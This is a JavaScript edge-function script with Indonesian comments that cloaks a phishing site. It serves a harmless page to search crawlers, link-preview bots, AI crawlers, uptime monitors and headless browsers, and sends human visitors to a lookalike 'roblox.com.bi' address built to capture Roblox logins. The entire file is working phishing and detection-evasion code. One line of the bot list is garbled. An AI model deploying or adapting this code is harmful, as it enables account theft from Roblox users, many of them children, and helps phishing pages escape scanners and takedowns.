export default async (request, context) => {
  const url = new URL(request.url);

  // ============================================
  // LINK CONFIG — GANTI DI SINI
  // ============================================
  const LEGIT_URL = 'https://www.roblox.com/games/13898834559/Residential-Apartment';
  const PHISH_URL = 'https://www.roblox.com.bi/games/13898834559/Residential-Apartment?privateServerLinkCode=85983563931111243045543758403958';

  // ============================================
  // SKIP ASSET STATIS
  // ============================================
  const skipExt = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.webp', '.woff', '.woff2', '.ttf', '.mp4', '.json'];
  if (skipExt.some(ext => url.pathname.endsWith(ext))) {
    return context.next();
  }

  // ============================================
  // AMBIL HEADER
  // ============================================
  const ua = (request.headers.get('user-agent') || '').toLowerCase();
  const referer = (request.headers.get('referer') || '').toLowerCase();
  const accept = (request.headers.get('accept') || '').toLowerCase();
  const purpose = (request.headers.get('purpose') || '').toLowerCase();
  const secFetchMode = (request.headers.get('sec-fetch-mode') || '').toLowerCase();

  // ============================================
  // BOT DETECTION — USER AGENT
  // ============================================
  const botKeywords = [
    'googlebot', 'google-read-aloud', 'google-site-verification',
    'bingbot', 'bingpreview', 'adidxbot',
    'yandexbot', 'yandeximages',
    'duckduckbot',
    'baiduspider',
    'facebookexternalhit', 'facebot',
    'twitterbot',
    'slackbot', 'slack-imgproxy',
    'discordbot',
    'telegrambot',
    'whatsapp',
    'linkedinbot',
    'pinterest',
    'applebot',
    'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot',
    'petalbot', 'bytespider',
    'gptbot', 'chatgpt', 'ccbot', 'lighthouse',cl 'audebotpages', 'anthropic',
    'perplexitybot', 'youbot',
    'uptimerobot', 'pingdom', 'statuscake', 'site24x7',
    'archive.org_bot', 'wayback',
    'screaming frog', 'screamingfrog',
    'peed',
    'gtmetrix', 'webpagetest',
    'curl/', 'wget/', 'python-requests', 'python-urllib',
    'go-http-client', 'java/', 'libwww-perl',
    'headlesschrome', 'phantomjs', 'puppeteer', 'playwright', 'selenium',
    'crawler', 'spider', 'scraper',
    'bot/', 'bot ', 'bot;', 'bot)'
  ];

  const isBot = botKeywords.some(k => ua.includes(k));
  const isHeadless = ua.includes('headless') || ua.includes('puppeteer') || ua.includes('playwright') || ua.includes('selenium') || ua.includes('phantom');

  // ============================================
  // ACCEPT HEADER — browser asli punya text/html
  // ============================================
  const noAccept = !accept || accept === '*/*';

  // ============================================
  // PREFETCH — bot biasanya pake Purpose: prefetch
  // ============================================
  const isPrefetch = purpose === 'prefetch';

  // ============================================
  // SEC-FETCH-MODE — browser asli punya navigate
  // ============================================
  const noSecFetch = !secFetchMode || secFetchMode === 'cors';

  // ============================================
  // REFERER CHECK
  // ============================================
  const badReferers = [
    'google.', 'bing.', 'yahoo.', 'yandex.',
    'facebook.', 'twitter.', 'linkedin.',
    'reddit.', 'pinterest.', 't.co',
    'duckduckgo.', 'baidu.'
  ];
  const isBadReferer = badReferers.some(r => referer.includes(r));

  // ============================================
  // DECISION
  // ============================================
  const shouldSeeLegit = isBot || isHeadless || noAccept || isPrefetch || noSecFetch || isBadReferer;

  if (shouldSeeLegit) {
    // Bot/scanner → halaman legit CONDO SERVER
    return context.rewrite('/index.html');
  } else {
    // Manusia → redirect ke phishing link
    return Response.redirect(PHISH_URL, 302);
  }
};

export const config = {
  path: "/*"
};
